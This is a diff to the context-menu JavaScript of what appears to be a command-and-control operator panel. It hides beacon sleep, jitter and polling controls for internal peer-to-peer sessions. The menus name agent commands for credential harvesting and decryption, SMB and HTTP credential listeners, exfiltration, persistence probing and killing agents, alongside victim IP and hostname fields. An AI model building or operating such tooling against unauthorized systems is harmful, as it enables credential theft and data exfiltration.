@@ -244,10 +244,10 @@ const ContextMenu = (() => {
         { label: '/creds harvest', action: () => _sendCmd(sid, '/creds harvest') },
         { label: '/creds harvest decrypt', action: () => _sendCmd(sid, '/creds harvest decrypt') },
       ]},
-      { label: 'Beacon Config', icon: '⏱', sub: [
+      ...(!s.p2p_is_internal ? [{ label: 'Beacon Config', icon: '⏱', sub: [
         { label: '/sleep…', action: () => { Sessions.select(sid); setTimeout(() => _openPromptModal('Sleep (seconds)', s.agent_sleep || 30, async v => { const n = parseInt(v, 10); if (n > 0) { try { await API.sleep(sid, n); Toast.ok('Sleep', `Set to ${n}s`); } catch(e) { Toast.error('Sleep failed', e.message); } } }), 80); } },
         { label: '/jitter…', action: () => { Sessions.select(sid); setTimeout(() => _openPromptModal('Jitter (%)', s.agent_jitter || 20, async v => { const n = parseInt(v, 10); if (n >= 0 && n <= 50) { try { await API.jitter(sid, n); Toast.ok('Jitter', `Set to ${n}%`); } catch(e) { Toast.error('Jitter failed', e.message); } } }), 80); } },
-      ]},
+      ]}] : []),
       { label: 'File Operations', icon: '📁', sub: [
         { label: '/download…', action: () => { Sessions.select(sid); setTimeout(() => _openPromptModal('Remote path to download', '', v => { if (v) _sendCmd(sid, `/download ${v}`); }), 80); } },
         { label: '/upload…', action: () => { Sessions.select(sid); setTimeout(() => _triggerUpload(), 80); } },
@@ -356,23 +356,35 @@ const ContextMenu = (() => {
       }, disabled: !hasCbText },
       { label: 'Clear Input', icon: '✕', action: () => { if (inp) { inp.value = ''; inp.focus(); } }, disabled: !hasText },
       { sep: true },
-      { label: 'Command Shortcuts', icon: '⚡', sub: [
-        { label: '/sysinfo', action: () => _setInput('/sysinfo') },
-        { label: '/status', action: () => _setInput('/status') },
-        { label: '/env', action: () => _setInput('/env') },
-        { label: '/sleep', action: () => _setInput('/sleep ') },
-        { label: '/jitter', action: () => _setInput('/jitter ') },
-        { sep: true },
-        { label: '/download', action: () => _setInput('/download ') },
-        { label: '/upload', action: () => _triggerUpload() },
-        { label: '/exfil', action: () => _setInput('/exfil ') },
-        { sep: true },
-        { label: '/persist probe', action: () => _setInput('/persist probe') },
-        { label: '/creds harvest', action: () => _setInput('/creds harvest') },
-        { label: '/creds listen start smb:445', action: () => _setInput('/creds listen start smb:445') },
-        { label: '/creds listen start http:80', action: () => _setInput('/creds listen start http:80') },
-        { label: '/creds listen dump', action: () => _setInput('/creds listen dump') },
-      ]},
+      { label: 'Command Shortcuts', icon: '⚡', sub: (() => {
+        const sid = Sessions.getActiveId ? Sessions.getActiveId() : null;
+        const sess = sid ? Sessions.getSession(sid) : null;
+        const isP2P = !!(sess && sess.p2p_is_internal);
+        const cmds = [
+          { label: '/sysinfo', action: () => _setInput('/sysinfo') },
+          { label: '/status', action: () => _setInput('/status') },
+          { label: '/env', action: () => _setInput('/env') },
+        ];
+        if (!isP2P) {
+          cmds.push(
+            { label: '/sleep', action: () => _setInput('/sleep ') },
+            { label: '/jitter', action: () => _setInput('/jitter ') },
+          );
+        }
+        cmds.push(
+          { sep: true },
+          { label: '/download', action: () => _setInput('/download ') },
+          { label: '/upload', action: () => _triggerUpload() },
+          { label: '/exfil', action: () => _setInput('/exfil ') },
+          { sep: true },
+          { label: '/persist probe', action: () => _setInput('/persist probe') },
+          { label: '/creds harvest', action: () => _setInput('/creds harvest') },
+          { label: '/creds listen start smb:445', action: () => _setInput('/creds listen start smb:445') },
+          { label: '/creds listen start http:80', action: () => _setInput('/creds listen start http:80') },
+          { label: '/creds listen dump', action: () => _setInput('/creds listen dump') },
+        );
+        return cmds;
+      })() },
     ];
   }
 
@@ -593,17 +605,23 @@ const ContextMenu = (() => {
     const locked = !!s.locked;
     const host = s.target_host || sid.slice(0, 8);
 
-    return [
-      { label: '/sleep…', icon: '⏱', action: () => _openPromptModal('Sleep (seconds)', s.agent_sleep || 30, async v => { const n = parseInt(v, 10); if (n > 0) { try { await API.sleep(sid, n); Toast.ok('Sleep', `Set to ${n}s`); } catch(e) { Toast.error('Sleep failed', e.message); } } }) },
-      { label: '/jitter…', icon: '📊', action: () => _openPromptModal('Jitter (%)', s.agent_jitter || 20, async v => { const n = parseInt(v, 10); if (n >= 0 && n <= 50) { try { await API.jitter(sid, n); Toast.ok('Jitter', `Set to ${n}%`); } catch(e) { Toast.error('Jitter failed', e.message); } } }) },
-      { sep: true },
-      { label: 'Stop Polling', icon: '■', action: async () => {
-        try { await API.stopPolling(sid); Toast.ok('Polling', 'Stopped'); } catch(e) { Toast.error('Poll stop failed', e.message); }
-      }},
-      { label: 'Resume Polling', icon: '▶', action: async () => {
-        try { await API.resumePolling(sid); Toast.ok('Polling', 'Resumed'); } catch(e) { Toast.error('Poll resume failed', e.message); }
-      }},
-      { sep: true },
+    const isP2P = !!s.p2p_is_internal;
+    const items = [];
+    if (!isP2P) {
+      items.push(
+        { label: '/sleep…', icon: '⏱', action: () => _openPromptModal('Sleep (seconds)', s.agent_sleep || 30, async v => { const n = parseInt(v, 10); if (n > 0) { try { await API.sleep(sid, n); Toast.ok('Sleep', `Set to ${n}s`); } catch(e) { Toast.error('Sleep failed', e.message); } } }) },
+        { label: '/jitter…', icon: '📊', action: () => _openPromptModal('Jitter (%)', s.agent_jitter || 20, async v => { const n = parseInt(v, 10); if (n >= 0 && n <= 50) { try { await API.jitter(sid, n); Toast.ok('Jitter', `Set to ${n}%`); } catch(e) { Toast.error('Jitter failed', e.message); } } }) },
+        { sep: true },
+        { label: 'Stop Polling', icon: '■', action: async () => {
+          try { await API.stopPolling(sid); Toast.ok('Polling', 'Stopped'); } catch(e) { Toast.error('Poll stop failed', e.message); }
+        }},
+        { label: 'Resume Polling', icon: '▶', action: async () => {
+          try { await API.resumePolling(sid); Toast.ok('Polling', 'Resumed'); } catch(e) { Toast.error('Poll resume failed', e.message); }
+        }},
+        { sep: true },
+      );
+    }
+    items.push(
       { label: locked ? 'Unlock Session' : 'Lock Session', icon: locked ? '🔓' : '🔒', action: async () => {
         try { await API.toggleLock(sid); } catch(e) { Toast.error('Lock failed', e.message); }
       }},
@@ -611,7 +629,8 @@ const ContextMenu = (() => {
       { label: '/stop', icon: '⏹', danger: true, disabled: locked, action: () => _sendCmd(sid, '/stop') },
       { label: '/kill', icon: '💀', danger: true, disabled: locked, action: () => { if (confirm(`Kill agent on ${host}?`)) Sessions.doKillAgent(); } },
       { label: 'Delete Session', icon: '🗑', danger: true, disabled: locked, action: () => { if (confirm(`Delete session ${sid.slice(0, 8)}?`)) Sessions.doWipeSession(); } },
-    ];
+    );
+    return items;
   }
 
   /* ── Info tab ─────────────────────────────────────────────────────────── */
@@ -661,20 +680,25 @@ const ContextMenu = (() => {
     const s = Sessions.getSession(sid);
     if (!s) return [];
 
-    return [
+    const items = [
       { label: 'Copy Session ID', icon: '📋', action: () => _clip(sid) },
       { label: 'Copy Folder Path', icon: '📋', action: () => _clip(s.folder_path), disabled: !s.folder_path },
       { label: 'Copy Internal IP', icon: '📋', action: () => _clip(s.target_ip), disabled: !s.target_ip },
       { label: 'Copy External IP', icon: '📋', action: () => _clip(s.target_ip_ext), disabled: !s.target_ip_ext },
       { label: 'Copy Hostname', icon: '📋', action: () => _clip(s.target_host), disabled: !s.target_host },
-      { sep: true },
-      { label: 'Stop Polling', icon: '■', action: async () => {
-        try { await API.stopPolling(sid); Toast.ok('Polling', 'Stopped'); } catch(e) { Toast.error('Poll stop failed', e.message); }
-      }},
-      { label: 'Resume Polling', icon: '▶', action: async () => {
-        try { await API.resumePolling(sid); Toast.ok('Polling', 'Resumed'); } catch(e) { Toast.error('Poll resume failed', e.message); }
-      }},
     ];
+    if (!s.p2p_is_internal) {
+      items.push(
+        { sep: true },
+        { label: 'Stop Polling', icon: '■', action: async () => {
+          try { await API.stopPolling(sid); Toast.ok('Polling', 'Stopped'); } catch(e) { Toast.error('Poll stop failed', e.message); }
+        }},
+        { label: 'Resume Polling', icon: '▶', action: async () => {
+          try { await API.resumePolling(sid); Toast.ok('Polling', 'Resumed'); } catch(e) { Toast.error('Poll resume failed', e.message); }
+        }},
+      );
+    }
+    return items;
   }
 
   /* ── Empty state (no session selected) ────────────────────────────────── */
